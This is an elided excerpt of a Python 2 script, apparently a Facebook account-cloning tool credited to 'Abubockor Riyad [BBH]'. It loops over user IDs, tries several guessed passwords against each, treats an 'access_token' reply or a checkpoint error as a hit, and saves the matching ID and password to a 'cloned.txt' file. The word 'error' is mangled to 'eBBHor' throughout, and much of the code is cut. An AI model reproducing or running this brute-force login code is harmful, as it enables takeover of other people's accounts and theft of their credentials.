...
from requests.exceptions import ConnectionEBBHor
...
def pilih_login():
    ...
    if peak == '':
        print '\x1b[1;97mFill In CoBBHectly'
        pilih_login()
    elif peak == '1':
        Zeek()
...
def action():
    ...
    print 50 * '\x1b[1;94m-'
    xxx = str(len(id))
    jalan('\x1b[1;96m\xe2\x96\xacPROGRAMED BY Abubockor Riyad [BBH]')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[BBH-OK]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/cloned.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['eBBHor_msg']:
                print '\x1b[1;92m[BBH-OK] ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[BBH-OK]  ' + k + c + user + '  |  ' + pass2
                    okb = open('save/cloned.txt', 'a')
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;92m[BBH-OK] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/cloned.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[BBH-OK]  ' + k + c + user + '  |  ' + pass4
                            okb = open('save/cloned.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['eBBHor_msg']:
                            print '\x1b[1;92m[BBH-CP] ' + k + c + user + '  |  ' + pass4
                            cps = open('save/cloned.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[BBH-CP]  ' + k + c + user + '  |  ' + pass5
                                okb = open('save/cloned.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['eBBHor_msg']:
                                print '\x1b[1;97m[BBH-CP] ' + k + c + user + '  |  ' + pass5
                                cps = open('save/cloned.txt', 'a')
